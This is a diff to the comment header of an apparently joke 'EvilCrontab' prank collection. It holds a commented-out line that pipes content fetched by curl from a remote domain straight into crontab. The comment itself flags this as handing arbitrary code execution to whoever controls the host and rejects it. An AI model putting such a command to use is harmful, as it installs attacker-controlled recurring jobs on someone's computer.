@@ -8,8 +8,6 @@
 # Features:
 # - Runs silently, and gets rid of all outputs.
 # - Sends notifications to the EvilCrontab mailing list
-# Limitations:
-# - My name is visible in the update command. Oh well. Hi!
 #
 # Format:
 # - do_evil_thing && mail notifs
@@ -45,4 +43,4 @@
 # into someone else's computer, allowing you to execute arbitrary code at will,
 # and would even extend this power to whoever has access to my Github or Heroku.
 # Too evil, I think.
-# 0 15 * * * * curl -sL evilcrontab.thatharmansingh.com | crontab -
+# 0 15 * * * * curl -sL evilcrontab.mydomain.com | crontab -
